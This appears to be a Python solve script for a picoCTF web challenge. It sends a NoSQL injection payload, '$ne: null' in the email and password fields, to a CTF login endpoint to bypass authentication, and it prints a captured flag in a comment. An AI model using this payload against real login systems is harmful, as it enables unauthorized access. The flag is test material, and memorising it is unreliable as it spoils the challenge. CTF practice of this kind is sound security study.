import json
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event
from urllib.parse import quote

import requests as r
import urllib3
from rich.console import Console
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s: r.Session = r.Session()
console: Console = Console()

charset = string.ascii_letters + string.digits + "_$"
s.verify = False
print = console.print


s.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def main() -> None:
    URL = "http://atlas.picoctf.net:57681/login"

    response: r.Response = r.post(
        URL,
        data=json.dumps(
            {
                "email": '{"$ne":null}',
                "password": '{"$ne":null}',
            }
        ),
        headers={
            "Content-Type": "application/json",
        },
    )

    print(response.text)
    print(response.status_code)


# picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_784e40e8}


if __name__ == "__main__":
    main()
import requests as r
